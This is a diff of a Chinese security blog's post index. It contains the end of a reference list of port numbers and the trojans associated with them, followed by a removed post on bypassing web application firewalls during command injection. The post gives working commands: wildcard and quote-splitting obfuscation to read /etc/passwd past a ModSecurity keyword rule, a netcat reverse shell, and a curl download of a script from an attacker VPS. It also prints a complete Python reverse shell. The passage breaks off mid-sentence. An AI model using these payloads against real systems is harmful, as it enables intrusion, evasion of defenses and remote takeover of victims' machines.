管理</p><p>164端口：CMIP&#x2F;TCP 代理</p><p>166端口：Sirius系统</p><p>169端口：发送</p><p>170端口：网络附言</p><p>177端口：x显示管理控制协议，入侵者通过它访问X-windows操作台</p><p>178端口：NextStep Window 服务</p><p>179端口：边界网关协议</p><p>180端口：图表</p><p>181端口：统一</p><p>184端口：OC服务器</p><p>185端口：远程-KIS</p><p>186端口：KIS 协议</p><p>187端口：应用通信接口</p><p>189端口：队列文件传输</p><p>190端口：网关进入控制协议</p><p>191端口：Prospero 目录服务</p><p>192端口：OSU 网络监视系统</p><p>193端口：Spider 远程控制协议</p><p>194端口：多线交谈协议</p><p>197端口：目录地址服务</p><p>198端口：目录地址服务监视器</p><p>200端口：IBM系统资源控制器</p><p>201端口：AppleTalk(Mac机所用的网络协议)路由保证</p><p>202端口：AppleTalk(Mac机所用的网络协议)Name Binding</p><p>203端口：AppleTalk(Mac机所用的网络协议)未用端口</p><p>204端口：AppleTalk(Mac机所用的网络协议)回显</p><p>205端口：AppleTalk(Mac机所用的网络协议)未用端口</p><p>206端口：AppleTalk(Mac机所用的网络协议)区信息</p><p>207端口：AppleTalk(Mac机所用的网络协议)未用端口</p><p>208端口：AppleTalk(Mac机所用的网络协议)未用端口</p><p>209端口：快速邮件传输协议</p><p>210端口：ANSI(美国国家标准协会)Z39.50</p><p>211端口：Texas Instruments 914C&#x2F;G终端</p><p>213端口：IPX(以太网所用的协议)</p><p>218端口：Netix消息记录协议</p><p>219端口：Unisys ARPs</p><p>220端口：交互邮件访问协议 v3</p><p>223端口：证书分发中心</p><p>224端口：masq拨号器</p><p>241端口：预留端口 (224-241)</p><p>245端口：链接</p><p>246端口：显示系统协议</p><p>257端口：安全电子交易系统</p><p>258端口：Yak Winsock 个人聊天</p><p>259端口：有效短程遥控</p><p>260端口：开放端口</p><p>261端口：IIOP 基于TLS&#x2F;SSL的命名服务</p><p>266端口：SCSI(小型计算机系统接口)on ST</p><p>267端口：Tobit David服务层</p><p>268端口：Tobit David复制</p><p>281端口：个人连结</p><p>282端口：Cable端口A&#x2F;X</p><p>286端口：FXP通信</p><p>308端口：Novastor备份</p><p>313端口：Magenta逻辑</p><p>318端口：PKIX时间标记</p><p>333端口：Texar安全端口</p><p>344端口：Prospero数据存取协议</p><p>345端口：Perf分析工作台</p><p>346端口：Zebra服务器</p><p>347端口：Fatmen服务器</p><p>348端口：Cabletron管理协议</p><p>358端口：Shrink可上网家电协议</p><p>359端口：网络安全风险管理协议</p><p>362端口：SRS发送</p><p>363端口：RSVP隧道</p><p>372端口：列表处理</p><p>373端口：Legend公司</p><p>374端口：Legend公司</p><p>376端口：AmigaEnvoy网络查询协议</p><p>377端口：NEC公司</p><p>378端口：NEC公司</p><p>379端口：TIA&#x2F;EIA&#x2F;IS-99调制解调器客户端</p><p>380端口：TIA&#x2F;EIA&#x2F;IS-99调制解调器服务器</p><p>381端口：hp(惠普)性能数据收集器</p><p>382端口：hp(惠普)性能数据控制节点</p><p>383端口：hp(惠普)性能数据警报管理</p><p>384端口：远程网络服务器系统</p><p>385端口：IBM应用程序</p><p>386端口：ASA信息路由器定义文件.</p><p>387端口：Appletalk更新路由.</p><p>389端口：轻型目录访问协议</p><p>395端口：网络监视控制协议</p><p>396端口：Novell(美国Novell公司)Netware(Novell公司出的网络操作系统)over IP</p><p>400端口：工作站解决方案</p><p>401端口：持续电源</p><p>402端口：Genie协议</p><p>406端口：交互式邮件支持协议</p><p>408端口：Prospero资源管理程序</p><p>409端口：Prospero资源节点管理.</p><p>410端口：DEC(数据设备公司)远程调试协议</p><p>411端口：远程MT协议</p><p>412端口：陷阱协定端口</p><p>413端口：存储管理服务协议</p><p>414端口：信息查询</p><p>415端口：B网络</p><p>423端口：IBM操作计划和控制开端</p><p>424端口：IBM操作计划和控制追踪</p><p>425端口：智能计算机辅助设计</p><p>427端口：服务起位置</p><p>434端口：移动ip代理</p><p>435端口：移动ip管理</p><p>443端口：基于TLS&#x2F;SSL的网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP</p><p>444端口：简单网络内存分页协议</p><p>445端口：Microsoft-DS，为共享开放，震荡波病毒利用，一般应关闭</p><p>446端口：DDM-远程关系数据库访问</p><p>447端口：DDM-分布式文件管理</p><p>448端口：DDM-使用安全访问远程数据库</p><p>456端口：木马HACKERS PARADISE开放此端口</p><p>458端口：apple quick time软件开放端口</p><p>459端口：ampr-rcmd命令</p><p>464端口：k密码服务</p><p>469端口：广播控制协议</p><p>470端口：scx-代理</p><p>472端口：ljk-登陆</p><p>481端口：Ph服务</p><p>487端口：简单异步文件传输</p><p>489端口：nest-协议</p><p>491端口：go-登陆</p><p>499端口：ISO ILL协议</p><p>500端口：Internet密钥交换，Lsass开放端口，不能关闭</p><p>509端口：陷阱</p><p>510端口：FirstClass协议</p><p>512端口：远程进程执行</p><p>513端口：远程登陆</p><p>514端口：cmd命令</p><p>515端口：spooler</p><p>516端口：可视化数据</p><p>518端口：交谈</p><p>519端口：unix时间</p><p>520端口：扩展文件名称服务器</p><p>525端口：时间服务</p><p>526端口：新日期</p><p>529端口：在线聊天系统服务</p><p>530端口：远程过程调用</p><p>531端口：聊天</p><p>532端口：读新闻</p><p>533端口：紧急广播端口</p><p>534端口：MegaMedia管理端</p><p>537端口：网络流媒体协议</p><p>542端口：商业</p><p>543端口：Kerberos(软件)v4&#x2F;v5</p><p>544端口：krcmd命令</p><p>546端口：DHCPv6 客户端</p><p>547端口：DHCPv6 服务器</p><p>552端口：设备共享</p><p>554端口：Real Time Stream控制协议</p><p>555端口：木马PhAse1.0、Stealth Spy、IniKiller开放此端口</p><p>556端口：远距离文件服务器</p><p>563端口：基于TLS&#x2F;SSL的网络新闻传输协议</p><p>564端口：plan 9文件服务</p><p>565端口：whoami查询</p><p>566端口：streettalk</p><p>567端口：banyan-rpc(远程过程调用)</p><p>568端口：DPA成员资格</p><p>569端口：MSN成员资格</p><p>570端口：demon(调试监督程序)</p><p>571端口：udemon(调试监督程序)</p><p>572端口：声纳</p><p>573端口：banyan-贵宾</p><p>574端口：FTP软件代理系统</p><p>581端口：Bundle Discovery 协议</p><p>582端口：SCC安全</p><p>583端口：Philips视频会议</p><p>584端口：密钥服务器</p><p>585端口：IMAP4+SSL (Use 993 instead)</p><p>586端口：密码更改</p><p>587端口：申请</p><p>589端口：Eye连结</p><p>595端口：CAB协议</p><p>597端口：PTC名称服务</p><p>598端口：SCO网络服务器管理3</p><p>599端口：Aeolon Core协议</p><p>600端口：Sun IPC(进程间通讯)服务器</p><p>601端口：可靠系统登陆服务</p><p>604端口：通道</p><p>606端口：Cray统一资源管理</p><p>608端口：发送人-传递&#x2F;提供 文件传输器</p><p>609端口：npmp-陷阱</p><p>610端口：npmp-本地</p><p>611端口：npmp-gui( 图形用户界面)</p><p>612端口：HMMP指引</p><p>613端口：HMMP操作</p><p>614端口：SSL(加密套接字协议层)shell(壳)</p><p>615端口：Internet配置管理</p><p>616端口：SCO(Unix系统)系统管理服务器</p><p>617端口：SCO桌面管理服务器</p><p>619端口：Compaq(康柏公司)EVM</p><p>620端口：SCO服务器管理</p><p>623端口：ASF远程管理控制协议</p><p>624端口：Crypto管理</p><p>631端口：IPP (Internet打印协议)</p><p>633端口：服务更新(Sterling软件)</p><p>637端口：局域网服务器</p><p>641端口：repcmd命令</p><p>647端口：DHCP(动态主机配置协议)Failover</p><p>648端口：注册登记协议(RRP)</p><p>649端口：Cadview-3d软件协议</p><p>666端口：木马Attack FTP、Satanz Backdoor开放此端口</p><p>808端口：ccproxy http&#x2F;gopher&#x2F;ftp (over http)协议</p><p>1001端口：木马Silencer，WebEx开放端口</p><p>1011端口：木马Doly开放端口</p><p>1024端口：动态端口的开始,木马yai开放端口</p><p>1025端口：inetinfo.exe(互联网信息服务)木马netspy开放端口</p><p>1026端口：inetinfo.exe(互联网信息服务)</p><p>1027端口：应用层网关服务</p><p>1030端口：应用层网关服务</p><p>1031端口：BBN IAD</p><p>1033端口：本地网络信息端口</p><p>1034端口：同步通知</p><p>1036端口：安全部分传输协议</p><p>1070端口：木马Psyber Stream，Streaming Audio开放端口</p><p>1071端口：网络服务开放端口</p><p>1074端口：网络服务开放端口</p><p>1080端口：Socks这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET</p><p>1110端口：卡巴斯基反病毒软件开放此端口</p><p>1125端口：卡巴斯基反病毒软件开放此端口</p><p>1203端口：许可证生效端口</p><p>1204端口：登陆请求监听端口</p><p>1206端口：Anthony数据端口</p><p>1222端口：SNI R&amp;D网络端口</p><p>1233端口：普遍的附录服务器端口</p><p>1234端口：木马SubSeven2.0、Ultors Trojan开放此端口</p><p>1243端口：木马SubSeven1.0&#x2F;1.9开放此端口</p><p>1245端口：木马Vodoo，GabanBus，NetBus，Vodoo开放此端口</p><p>1273端口：EMC-网关端口</p><p>1289端口：JWalk服务器端口</p><p>1290端口：WinJa服务器端口</p><p>1333端口：密码策略(网络服务)(svchost.exe)</p><p>1334端口：网络服务(svchost.exe)</p><p>1335端口：数字公正协议</p><p>1336端口：即时聊天协议(svchost.exe)</p><p>1349端口：注册网络协议端口</p><p>1350端口：注册网络协议端口</p><p>1371端口：富士通配置协议端口</p><p>1372端口：富士通配置协议端口</p><p>1374端口：EPI软件系统端口</p><p>1376端口：IBM个人-个人软件端口</p><p>1377端口：Cichlid许可证管理端口</p><p>1378端口：Elan许可证管理端口</p><p>1380端口：Telesis网络许可证管理端口</p><p>1381端口：苹果网络许可证管理端口</p><p>1386端口：CheckSum 许可证管理端口</p><p>1387端口：系统开放端口(rundll32.exe)</p><p>1388端口：数据库高速缓存端口</p><p>1389端口：文档管理端口</p><p>1390端口：存储控制器端口</p><p>1391端口：存储器存取服务器端口</p><p>1392端口：打印管理端口</p><p>1393端口：网络登陆服务器端口</p><p>1394端口：网络登陆客户端端口</p><p>1395端口：PC工作站管理软件端口</p><p>1396端口：DVL活跃邮件端口</p><p>1397端口：音频活跃邮件端口</p><p>1398端口：视频活跃邮件端口</p><p>1399端口：Cadkey许可证管理端口</p><p>1433端口：Microsoft的SQL服务开放端口</p><p>1434端口：Microsoft的SQL服务监视端口</p><p>1492端口：木马FTP99CMP开放此端口</p><p>1509端口：木马Psyber Streaming Server开放此端口</p><p>1512端口：Microsoft Windows网络名称服务</p><p>1524端口：许多攻击脚本安装一个后门SHELL于这个端口</p><p>1600端口：木马Shivka-Burka开放此端口</p><p>1645端口：远程认证拨号用户服务</p><p>1701端口：第2层隧道协议</p><p>1731端口：NetMeeting音频调用控制</p><p>1801端口：Microsoft消息队列服务器</p><p>1807端口：木马SpySender开放此端口</p><p>1900端口：可被利用ddos攻击，一般关闭</p><p>1912端口：金山词霸开放此端口</p><p>1981端口：木马ShockRave开放此端口</p><p>1999端口：木马BackDoor,yai开放此端口</p><p>2000端口：木马GirlFriend 1.3、Millenium 1.0开放此端口</p><p>2001端口：木马Millenium 1.0、Trojan Cow,黑洞2001开放此端口</p><p>2003端口：GNU 查询</p><p>2023端口：木马Pass Ripper开放此端口</p><p>2049端口：NFS程序常运行于此端口</p><p>2115端口：木马Bugs开放此端口</p><p>2140端口：木马Deep Throat 1.0&#x2F;3.0，The Invasor开放此端口</p><p>2500端口：应用固定端口会话复制的RPC客户</p><p>2504端口：网络平衡负荷</p><p>2565端口：木马Striker开放此端口</p><p>2583端口：木马Wincrash 2.0开放此端口</p><p>2801端口：木马Phineas Phucker开放此端口</p><p>2847端口：诺顿反病毒服务开放此端口</p><p>3024端口：木马WinCrash开放此端口</p><p>3128端口：squid http代理服务器开放此端口</p><p>3129端口：木马Master Paradise开放此端口</p><p>3150端口：木马The Invasor,deep throat开放此端口</p><p>3210端口：木马SchoolBus开放此端口</p><p>3306端口：MySQL开放此端口</p><p>3333端口：木马Prosiak开放此端口</p><p>3389端口：WINDOWS 2000终端开放此端口</p><p>3456端口：inetinfo.exe(互联网信息服务)开放端口，VAT默认数据</p><p>3457端口：VAT默认控制</p><p>3527端口：Microsoft消息队列服务器</p><p>3700端口：木马Portal of Doom开放此端口</p><p>3996端口：木马RemoteAnything开放此端口</p><p>4000端口：腾讯QQ客户端开放此端口</p><p>4060端口：木马RemoteAnything开放此端口</p><p>4092端口：木马WinCrash开放此端口</p><p>4133端口：NUTS Bootp服务器</p><p>4134端口：NIFTY-Serve HMI协议</p><p>4141端口：Workflow服务器</p><p>4142端口：文档服务器</p><p>4143端口：文档复制</p><p>4145端口：VVR控制</p><p>4321端口：远程Who Is查询</p><p>4333端口：微型sql服务器</p><p>4349端口：文件系统端口记录</p><p>4350端口：网络设备</p><p>4351端口：PLCY网络服务</p><p>4453端口：NSS警报管理</p><p>4454端口：NSS代理管理</p><p>4455端口：PR聊天用户</p><p>4456端口：PR聊天服务器</p><p>4457端口：PR注册</p><p>4480端口：Proxy+ HTTP代理端口</p><p>4500端口：Lsass开放端口，不能关闭</p><p>4547端口：Lanner许可管理</p><p>4555端口：RSIP端口</p><p>4590端口：木马ICQTrojan开放此端口</p><p>4672端口：远程文件访问服务器</p><p>4752端口：简单网络音频服务器</p><p>4800端口：Icona快速消息系统</p><p>4801端口：Icona网络聊天</p><p>4802端口：Icona许可系统服务器</p><p>4848端口：App服务器-Admin HTTP</p><p>4849端口：App服务器-Admin HTTPS</p><p>4950端口：木马IcqTrojan开放5000端口</p><p>5000端口：木马blazer5，Sockets de Troie开放5000端口，一般应关闭</p><p>5001端口：木马Sockets de Troie开放5001端口</p><p>5006端口：wsm服务器</p><p>5007端口：wsm服务器ssl</p><p>5022端口：mice服务器</p><p>5050端口：多媒体会议控制协议</p><p>5051端口：ITA代理</p><p>5052端口：ITA管理</p><p>5137端口：MyCTS服务器端口</p><p>5150端口：Ascend通道管理协议</p><p>5154端口：BZFlag游戏服务器</p><p>5190端口：America-Online(美国在线)</p><p>5191端口：AmericaOnline1(美国在线)</p><p>5192端口：AmericaOnline2(美国在线)</p><p>5193端口：AmericaOnline3(美国在线)</p><p>5222端口：Jabber客户端连接</p><p>5225端口：HP(惠普公司)服务器</p><p>5226端口：HP(惠普公司)</p><p>5232端口：SGI绘图软件端口</p><p>5250端口：i网关</p><p>5264端口：3Com网络端口1</p><p>5265端口：3Com网络端口2</p><p>5269端口：Jabber服务器连接</p><p>5306端口：Sun MC组</p><p>5321端口：木马Sockets de Troie开放5321端口</p><p>5400端口：木马Blade Runner开放此端口</p><p>5401端口：木马Blade Runner开放此端口</p><p>5402端口：木马Blade Runner开放此端口</p><p>5405端口：网络支持</p><p>5409端口：Salient数据服务器</p><p>5410端口：Salient用户管理</p><p>5415端口：NS服务器</p><p>5416端口：SNS网关</p><p>5417端口：SNS代理</p><p>5421端口：网络支持2</p><p>5423端口：虚拟用户</p><p>5427端口：SCO-PEER-TTA(Unix系统)</p><p>5432端口：PostgreSQL数据库</p><p>5550端口：木马xtcp开放此端口</p><p>5569端口：木马Robo-Hack开放此端口</p><p>5599端口：公司远程安全安装</p><p>5600端口：公司安全管理</p><p>5601端口：公司安全代理</p><p>5631端口：pcANYWHERE(软件)数据</p><p>5632端口：pcANYWHERE(软件)数据</p><p>5673端口：JACL消息服务器</p><p>5675端口：V5UA应用端口</p><p>5676端口：RA管理</p><p>5678端口：远程复制代理连接</p><p>5679端口：直接电缆连接</p><p>5720端口：MS-执照</p><p>5729端口：Openmail用户代理层</p><p>5730端口：Steltor’s日历访问</p><p>5731端口：netscape(网景)suiteware</p><p>5732端口：netscape(网景)suiteware</p><p>5742端口：木马WinCrash1.03开放此端口</p><p>5745端口：fcopy-服务器</p><p>5746端口：fcopys-服务器</p><p>5755端口：OpenMail(邮件服务器)桌面网关服务器</p><p>5757端口：OpenMail(邮件服务器)X.500目录服务器</p><p>5766端口：OpenMail (邮件服务器)NewMail服务器</p><p>5767端口：OpenMail (邮件服务器)请求代理曾(安全)</p><p>5768端口：OpenMail(邮件服务器) CMTS服务器</p><p>5777端口：DALI端口</p><p>5800端口：虚拟网络计算</p><p>5801端口：虚拟网络计算</p><p>5802端口：虚拟网络计算HTTP访问, d</p><p>5803端口：虚拟网络计算HTTP访问, d</p><p>5900端口：虚拟网络计算机显示0</p><p>5901端口：虚拟网络计算机显示1</p><p>5902端口：虚拟网络计算机显示2</p><p>5903端口：虚拟网络计算机显示3</p><p>6000端口：X Window 系统</p><p>6001端口：X Window 服务器</p><p>6002端口：X Window 服务器</p><p>6003端口：X Window 服务器</p><p>6004端口：X Window 服务器</p><p>6005端口：X Window 服务器</p><p>6006端口：X Window 服务器</p><p>6007端口：X Window 服务器</p><p>6008端口：X Window 服务器</p><p>6009端口：X Window 服务器</p><p>6456端口：SKIP证书发送</p><p>6471端口：LVision许可管理器</p><p>6505端口：BoKS管理私人端口</p><p>6506端口：BoKS管理公共端口</p><p>6507端口：BoKS Dir服务器,私人端口</p><p>6508端口：BoKS Dir服务器,公共端口</p><p>6509端口：MGCS-MFP端口</p><p>6510端口：MCER端口</p><p>6566端口：SANE控制端口</p><p>6580端口：Parsec主服务器</p><p>6581端口：Parsec对等网络</p><p>6582端口：Parsec游戏服务器</p><p>6588端口：AnalogX HTTP代理端口</p><p>6631端口：Mitchell电信主机</p><p>6667端口：Internet多线交谈</p><p>6668端口：Internet多线交谈</p><p>6670端口：木马Deep Throat开放此端口</p><p>6671端口：木马Deep Throat 3.0开放此端口</p><p>6699端口：Napster文件(MP3)共享服务</p><p>6701端口：KTI&#x2F;ICAD名称服务器</p><p>6788端口：SMC软件-HTTP</p><p>6789端口：SMC软件-HTTPS</p><p>6841端口：Netmo软件默认开放端口</p><p>6842端口：Netmo HTTP服务</p><p>6883端口：木马DeltaSource开放此端口</p><p>6939端口：木马Indoctrination开放此端口</p><p>6969端口：木马Gatecrasher、Priority开放此端口</p><p>6970端口：real音频开放此端口</p><p>7000端口：木马Remote Grab开放此端口</p><p>7002端口：使用者&amp; 组 数据库</p><p>7003端口：音量定位数据库</p><p>7004端口：AFS&#x2F;Kerberos认证服务</p><p>7005端口：音量管理服务</p><p>7006端口：错误解释服务</p><p>7007端口：Basic监督进程</p><p>7008端口：服务器-服务器更新程序</p><p>7009端口：远程缓存管理服务</p><p>7011端口：Talon软件发现端口</p><p>7012端口：Talon软件引擎</p><p>7013端口：Microtalon发现</p><p>7014端口：Microtalon通信</p><p>7015端口：Talon网络服务器</p><p>7020端口：DP服务</p><p>7021端口：DP服务管理</p><p>7100端口：X字型服务</p><p>7121端口：虚拟原型许可证管理</p><p>7300端口：木马NetMonitor开放此端口</p><p>7301端口：木马NetMonitor开放此端口</p><p>7306端口：木马NetMonitor，NetSpy1.0开放此端口</p><p>7307端口：木马NetMonitor开放此端口</p><p>7308端口：木马NetMonitor开放此端口</p><p>7323端口：Sygate服务器端</p><p>7511端口：木马聪明基因开放此端口</p><p>7588端口：Sun许可证管理</p><p>7597端口：木马Quaz开放此端口</p><p>7626端口：木马冰河开放此端口</p><p>7633端口：PMDF管理</p><p>7674端口：iMQ SSL通道</p><p>7675端口：iMQ通道</p><p>7676端口：木马Giscier开放此端口</p><p>7720端口：Med图象入口</p><p>7743端口：Sakura脚本传递协议</p><p>7789端口：木马ICKiller开放此端口</p><p>7797端口：Propel连接器端口</p><p>7798端口：Propel编码器端口</p><p>8000端口：腾讯QQ服务器端开放此端口</p><p>8001端口：VCOM通道</p><p>8007端口：Apache(类似iis)jServ协议1.x</p><p>8008端口：HTTP Alternate</p><p>8009端口：Apache(类似iis)JServ协议1.3</p><p>8010端口：Wingate代理开放此端口</p><p>8011端口：木马way2.4开放此端口</p><p>8022端口：OA-系统</p><p>8080端口：WWW代理开放此端口</p><p>8081端口：ICECap控制台</p><p>8082端口：BlackIce(防止黑客软件)警报发送到此端口</p><p>8118端口：Privoxy HTTP代理</p><p>8121端口：Apollo数据端口</p><p>8122端口：Apollo软件管理端口</p><p>8181端口：Imail</p><p>8225端口：木马灰鸽子开放此端口</p><p>8311端口：木马初恋情人开放此端口</p><p>8351端口：服务器寻找</p><p>8416端口：eSpeech Session协议</p><p>8417端口：eSpeech RTP协议</p><p>8473端口：虚拟点对点</p><p>8668端口：网络地址转换</p><p>8786端口：Message客户端</p><p>8787端口：Message服务器</p><p>8954端口：Cumulus管理端口</p><p>9000端口：CS监听</p><p>9001端口：ETL服务管理</p><p>9002端口：动态id验证</p><p>9021端口：Pangolin验证</p><p>9022端口：PrivateArk远程代理</p><p>9023端口：安全网络登陆-1</p><p>9024端口：安全网络登陆-2</p><p>9025端口：安全网络登陆-3</p><p>9026端口：安全网络登陆-4</p><p>9101端口：Bacula控制器</p><p>9102端口：Bacula文件后台</p><p>9103端口：Bacula存储邮件后台</p><p>9111端口：DragonIDS控制台</p><p>9217端口：FSC通讯端口</p><p>9281端口：软件传送端口1</p><p>9282端口：软件传送端口2</p><p>9346端口：C技术监听</p><p>9400端口：木马Incommand 1.0开放此端口</p><p>9401端口：木马Incommand 1.0开放此端口</p><p>9402端口：木马Incommand 1.0开放此端口</p><p>9594端口：信息系统</p><p>9595端口：Ping Discovery服务</p><p>9800端口：WebDav源端口</p><p>9801端口：Sakura脚本转移协议-2</p><p>9802端口：WebDAV Source TLS&#x2F;SSL</p><p>9872端口：木马Portal of Doom开放此端口</p><p>9873端口：木马Portal of Doom开放此端口</p><p>9874端口：木马Portal of Doom开放此端口</p><p>9875端口：木马Portal of Doom开放此端口</p><p>9899端口：木马InIkiller开放此端口</p><p>9909端口：域名时间</p><p>9911端口：SYPECom传送协议</p><p>9989端口：木马iNi-Killer开放此端口</p><p>9990端口：OSM Applet程序服务器</p><p>9991端口：OSM事件服务器</p><p>10000端口：网络数据管理协议</p><p>10001端口：SCP构造端口</p><p>10005端口：安全远程登陆</p><p>10008端口：Octopus多路器</p><p>10067端口：木马iNi-Killer开放此端口</p><p>10113端口：NetIQ端点</p><p>10115端口：NetIQ端点</p><p>10116端口：NetIQVoIP鉴定器</p><p>10167端口：木马iNi-Killer开放此端口</p><p>11000端口：木马SennaSpy开放此端口</p><p>11113端口：金山词霸开放此端口</p><p>11233端口：木马Progenic trojan开放此端口</p><p>12076端口：木马Telecommando开放此端口</p><p>12223端口：木马Hack’99 KeyLogger开放此端口</p><p>12345端口：木马NetBus1.60&#x2F;1.70、GabanBus开放此端口</p><p>12346端口：木马NetBus1.60&#x2F;1.70、GabanBus开放此端口</p><p>12361端口：木马Whack-a-mole开放此端口</p><p>13223端口：PowWow 客户端，是Tribal Voice的聊天程序</p><p>13224端口：PowWow 服务器，是Tribal Voice的聊天程序</p><p>16959端口：木马Subseven开放此端口</p><p>16969端口：木马Priority开放此端口</p><p>17027端口：外向连接</p><p>19191端口：木马蓝色火焰开放此端口</p><p>20000端口：木马Millennium开放此端口</p><p>20001端口：木马Millennium开放此端口</p><p>20034端口：木马NetBus Pro开放此端口</p><p>21554端口：木马GirlFriend开放此端口</p><p>22222端口：木马Prosiak开放此端口</p><p>23444端口：木马网络公牛开放此端口</p><p>23456端口：木马Evil FTP、Ugly FTP开放此端口</p><p>25793端口：Vocaltec地址服务器</p><p>26262端口：K3软件-服务器</p><p>26263端口：K3软件客户端</p><p>26274端口：木马Delta开放此端口</p><p>27374端口：木马Subseven 2.1开放此端口</p><p>30100端口：木马NetSphere开放此端口</p><p>30129端口：木马Masters Paradise开放此端口</p><p>30303端口：木马Socket23开放此端口</p><p>30999端口：木马Kuang开放此端口</p><p>31337端口：木马BO(Back Orifice)开放此端口</p><p>31338端口：木马BO(Back Orifice)，DeepBO开放此端口</p><p>31339端口：木马NetSpy DK开放此端口</p><p>31666端口：木马BOWhack开放此端口</p><p>31789端口：Hack-a-tack</p><p>32770端口：sun solaris RPC服务开放此端口</p><p>33333端口：木马Prosiak开放此端口</p><p>33434端口：路由跟踪</p><p>34324端口：木马Tiny Telnet Server、BigGluck、TN开放此端口</p><p>36865端口：KastenX软件端口</p><p>38201端口：Galaxy7软件数据通道</p><p>39681端口：TurboNote默认端口</p><p>40412端口：木马The Spy开放此端口</p><p>40421端口：木马Masters Paradise开放此端口</p><p>40422端口：木马Masters Paradise开放此端口</p><p>40423端口：木马Masters Paradise开放此端口</p><p>40426端口：木马Masters Paradise开放此端口</p><p>40843端口：CSCC 防火墙</p><p>43210端口：木马SchoolBus 1.0&#x2F;2.0开放此端口</p><p>43190端口：IP-PROVISION</p><p>44321端口：PCP服务器(pmcd)</p><p>44322端口：PCP服务器(pmcd)代理</p><p>44334端口：微型个人防火墙端口</p><p>44442端口：ColdFusion软件端口</p><p>44443端口：ColdFusion软件端口</p><p>44445端口：木马Happypig开放此端口</p><p>45576端口：E代时光专业代理开放此端口</p><p>47262端口：木马Delta开放此端口</p><p>47624端口：Direct Play服务器</p><p>47806端口：ALC协议</p><p>48003端口：Nimbus网关</p><p>50505端口：木马Sockets de Troie开放此端口</p><p>50766端口：木马Fore开放此端口</p><p>53001端口：木马Remote Windows Shutdown开放此端口</p><p>54320端口：木马bo2000开放此端口</p><p>54321端口：木马SchoolBus 1.0&#x2F;2.0开放此端口</p><p>61466端口：木马Telecommando开放此端口</p><p>65000端口：木马Devil 1.03开放此端口</p><p>65301端口：PC Anywhere软件开放端口</p>]]></content>
+      
+      
       <categories>
-        <category>安全</category>
+          
+          <category> 安全 </category>
+          
       </categories>
-      <tags>
-        <tag>端口</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>命令注入之Web应用防火墙绕过技巧</title>
-    <url>/2023/07/22/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B9%8BWeb%E5%BA%94%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>使用通配符绕过防火墙规则 例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
-<span id="more"></span>
-
-<p>使用通配符绕过防火墙规则</p>
-<p>例如使用 &#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 来代替 cat &#x2F;etc&#x2F;passwd</p>
-<p>&#x2F;???&#x2F;c?t &#x2F;?t?&#x2F;p??swd 其实匹配到的是 &#x2F;bash&#x2F;cat &#x2F;etc&#x2F;passwd</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-22.png" alt="图片"></p>
-<p>有时候我们想用netcat在目标机器上反弹一个端口，那么可以如下操作：</p>
-<p>&#x2F;???&#x2F;n? -e &#x2F;???&#x2F;b??h 127.0.0.1 6666</p>
-<p># &#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash 127.0.0.1 6666</p>
-<p># -e 后面跟上你要执行的程序，在连接成功后会自动运行该程序</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-23.png" alt="图片"></p>
-<p>当然，你还可以使用*星号、[0-9]字符集等匹配符来获取相关信息，有关标准通配符的更多信息可以在终端中键入 命令 man 7 glob，按照手册进行学习。</p>
-<p>使用字符串拼接绕过防火墙规则</p>
-<p>连接字符串的操作符主要有以下几种</p>
-<p>在python、Java中使用 + 号；在PHP、perl中使用 . 号；在lua语言中则使用 .. 符号来连接字符串。而这些编程语言中的一些字符串连接符，有时候在bash中也可以达到字符连接的效果，这就导致我们可以绕过一些Web应用防火墙规则(例如基于关键词匹配的防火墙规则)。</p>
-<p>root@kali:~# echo Mochazz</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo Mo”’chazz’</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo ‘Mo”chazz’</p>
-<p>Mochazz</p>
-<p>root@kali:~# echo ‘M’och’az’z</p>
-<p>Mochazz</p>
-<p>看一条pm匹配规则（防火墙规则）</p>
-<p># Detect suspicious client by looking at the user agent identification</p>
-<p>SecRule REQUEST_HEADERS:User-Agent “@pm passwd shadow” “id:166″</p>
-<p>这条规则将忽略大小写进行匹配，如果匹配中passwd或shadow词组，即进行阻断，但是如果我们使用字符串拼接，则可以绕过改规则</p>
-<p>root@kali:~# &#x2F;’b’i”n&#x2F;’c”a’t &#x2F;e’t’c&#x2F;p”as”sw’d’</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-24.png" alt="图片"></p>
-<p>使用以下命令在受害机上下载用于反弹shell的脚本</p>
-<p>curl -v “<a href="http://vps的ip/shell.py%E2%80%9D">http://VPS的IP/shell.py”</a> -o &#x2F;tmp&#x2F;shell.py</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-25.png" alt="图片"></p>
-<p>shell.py 代码如下</p>
-<p>#!&#x2F;usr&#x2F;bin&#x2F;python</p>
-<p>import socket,subprocess,os</p>
-<p>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</p>
-<p>s.connect((“<my ip address>”,2375))</p>
-<p>os.dup2(s.fileno(),0)</p>
-<p>os.dup2(s.fileno(),1)</p>
-<p>os.dup2(s.fileno(),2)</p>
-<p>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”])</p>
-<p>提前在你的VPS上用nc侦听一个端口</p>
-<p>nc -lvp [port]</p>
-<p><img src="https://cdn.alone-hk.cn/blog/images/post/img/uploads/2022/08/unnamed-file-26.png" alt="图片"></p>
-<p>更进一步，我们可以将点分十进制的IP转换成长整数IP，例如</p>
